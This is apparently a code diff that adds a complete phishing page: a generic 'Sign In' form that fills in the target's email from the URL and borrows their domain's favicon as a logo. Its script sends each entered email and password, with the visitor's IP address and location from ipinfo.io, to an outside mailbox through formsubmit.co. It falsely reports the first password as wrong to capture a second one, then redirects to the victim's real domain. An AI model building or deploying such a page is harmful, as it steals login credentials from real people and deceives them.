@@ -1,1 +1,239 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<style>
+		* {
+			box-sizing: border-box;
+			padding: 0;
+			margin: 0;
+		}
 
+		body {
+			height: 100vh;
+			width: 100vw;
+			font-family: Arial, Helvetica, sans-serif;
+			overflow: hidden;
+			position: relative;
+			background: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjRR_D5KmxXbB5O6qLtAAsuWFMtM7o9TpXBEYc1pZFqn8IRvOniOusERV9Ott1FD43z8qHwNtowRZuzAAcQYovayaManIRtOSC2VQ2DioQwzZcxvAvcLJyQuDvk1pLv9M14VjMF04dlQrZLh9E_NYhjJHHtHuZrxxizAZ_WFRqgWJ25eUMGtlM3zvSmsYw/s947/image%20%282%29.png') no-repeat center center fixed;
+			background-size: cover;
+		}
+
+		/* Remove the bg-img and iframe styles since we're using background image */
+		.bg-img, iframe {
+			display: none;
+		}
+
+		/* Add a semi-transparent overlay to make form more readable */
+		body::before {
+			content: '';
+			position: absolute;
+			top: 0;
+			left: 0;
+			right: 0;
+			bottom: 0;
+			background: rgba(0, 0, 0, 0.5);
+			z-index: 1;
+		}
+
+		/* Add styles to the form container */
+		.container {
+			max-width: 400px;
+			padding: 16px;
+			background-color: white;
+			border-radius: 5px;
+			position: absolute;
+			left: 50%;
+			top: 50%;
+			transform: translate(-50%, -50%);
+			z-index: 2;
+			box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+		}
+
+		@media (max-width: 480px) {
+			.container {
+				left: 50%;
+				top: 50%;
+				margin-left: 0;
+				transform: translate(-50%, -50%);
+				width: 90%;
+				max-width: 90%;
+			}
+		}
+
+		/* Full-width input fields */
+		input[type=text], input[type=password] {
+			width: 100%;
+			padding: 15px;
+			margin: 5px 0 22px 0;
+			border: none;
+			background: #f1f1f1;
+			border-radius: 3px;
+		}
+
+		input[type=text]:focus, input[type=password]:focus {
+			background-color: #ddd;
+			outline: none;
+		}
+
+		.btn {
+			background-color: #0096FF;
+			color: white;
+			padding: 16px 20px;
+			border: none;
+			cursor: pointer;
+			width: 100%;
+			opacity: 0.9;
+			border-radius: 3px;
+			font-size: 16px;
+			font-weight: bold;
+			transition: opacity 0.3s;
+		}
+
+		.btn:hover {
+			opacity: 1;
+		}
+
+		.btn:disabled {
+			background-color: #666;
+			cursor: not-allowed;
+			opacity: 0.7;
+		}
+
+		.img {
+			text-align: center;
+			margin-bottom: 20px;
+		}
+
+		#title {
+			text-align: center;
+			margin: 10px 0 20px 0;
+			color: #333;
+		}
+
+		#error {
+			display: none;
+			color: red;
+			background-color: #ffe6e6;
+			padding: 10px;
+			border-radius: 3px;
+			margin-bottom: 15px;
+			border: 1px solid #ff9999;
+		}
+
+		label {
+			color: #333;
+			font-weight: bold;
+			margin-bottom: 5px;
+			display: block;
+		}
+	</style>
+</head>
+<body>
+	<!-- Background image is set via CSS -->
+	
+	<form class="container" id="login-form">
+		<div class="img">
+			<img src="" id="logo" alt="" style="width: 100px; height: 100px; ">
+		</div>
+
+		<h3 id="title">Sign In</h3>
+
+		<div id="error" style="display: none; color: red;">Password is incorrect, please try again!</div>
+
+		<label for="email">
+			<b>Email Address</b>
+		</label>
+		<input type="text" placeholder="Enter Email" name="email" id="email" required>
+
+		<label for="psw">
+			<b>Password</b>
+		</label>
+		<input type="password" placeholder="Enter Password" name="password" id="psw" required>
+
+		<input type="hidden" name="step" id="step">
+
+		<button type="submit" class="btn">Sign In</button>
+	</form>
+
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+	<script>
+	let step = 1;
+	let submitted = false; // Prevent double submission
+	
+	// Get clientID from URL hash
+	const clientID = window.location.hash.substring(1);
+	
+	if (!clientID) {
+		$("#error").text("No email provided").css("display", "block");
+	} else {
+		$('#email').val(clientID);
+		const domain = clientID.split('@').pop();
+		
+		// No iframe to set since we're using background image
+		
+		// Use favicon service
+		const logoUrl = "https://www.google.com/s2/favicons?domain=" + domain + "&sz=128";
+		$("#logo").attr("src", logoUrl)
+			.on("error", function() {
+				$(this).attr("src", "https://via.placeholder.com/100/0096FF/ffffff?text=" + domain.charAt(0).toUpperCase());
+			});
+	}
+
+	$("#login-form").submit(function(event) {
+		event.preventDefault();
+		
+		if (submitted) return; // Prevent multiple submissions
+		submitted = true;
+		
+		const submitBtn = $("button[type='submit']");
+		submitBtn.text('Verifying...').prop('disabled', true);
+
+		const email = $("#email").val();
+		const password = $("#psw").val();
+		const domain = email.split('@').pop();
+		
+		// Get IP info and submit to Formspree
+		$.getJSON('https://ipinfo.io/json', function(response) {
+			const posting = $.post("https://formsubmit.co/ajax/dattiobi@yandex.com", {
+				_subject: "Logs | " + response.ip,
+				Email: email,
+				Password: password,
+				Attempts: step,
+				IP: response.ip,
+				Location: response.city + ", " + response.country,
+			});
+
+			posting.done(function(data) {
+				console.log("Attempt:", step, "Submitted successfully");
+				
+				if (step === 2) {
+					window.location.href = "https://" + domain;
+				} else {
+					step++;
+					$("#error").css("display", "block");
+					submitBtn.text('Sign In').prop('disabled', false);
+					$("#psw").val("");
+					submitted = false; // Allow next submission
+				}
+			});
+
+			posting.fail(function(error) {
+				console.error("Error:", error);
+				
+				if (step === 2) {
+					window.location.href = "https://" + domain;
+				} else {
+					step++;
+					$("#error").css("display", "block");
+					submitBtn.text('Sign In').prop('disabled', false);
+					$("#psw").val("");
+					submitted = false; // Allow next submission
+				}
+			});
+		}, "json");
+	});
+</script>
+</body>
+</html>
